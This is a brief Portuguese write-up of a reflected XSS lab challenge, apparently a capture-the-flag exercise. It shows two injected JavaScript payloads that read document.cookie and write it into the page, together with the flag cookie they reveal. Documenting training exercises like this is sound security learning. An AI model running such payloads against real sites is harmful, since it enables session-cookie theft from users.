# xss-reflect-web-hacking-42

# XSS Vulnerability: Reflect

## Cenário 1:

Realizado à analise no código é perceptivel que o padrão utilizado se chama "script" toda vez que retorna o resultado. Sabendo que o código já está retornando "script", foi adicionado no inputText:

        function displayText() {
            document.getElementById("output").innerHTML = "<b>" + "Cookie value: " + document.cookie + "</b>";

            var script = document.createElement("script");
            script.textContent = document.cookie;
            document.body.appendChild(script);
        }

Ou seja, a linguagem entende que é um novo script e localmente aplica a função.
Ao clicar no botão "Submit" 2 vezes, ele adere a nova função.

Output gerado:
Cookie value: ftCookies=If_You_See_Me_Its_Win
  

## Cenário 2
Neste cenário o parâmetro (javascript) haverá manipulação do campo do input e reflexão para a variável do Content-type "document.cookie"

Adicionado ao input:
document.getElementById("output").innerHTML = "<b>" + document.cookie + "</b>";

Output gerado:
ftCookies=If_You_See_Me_Its_Win
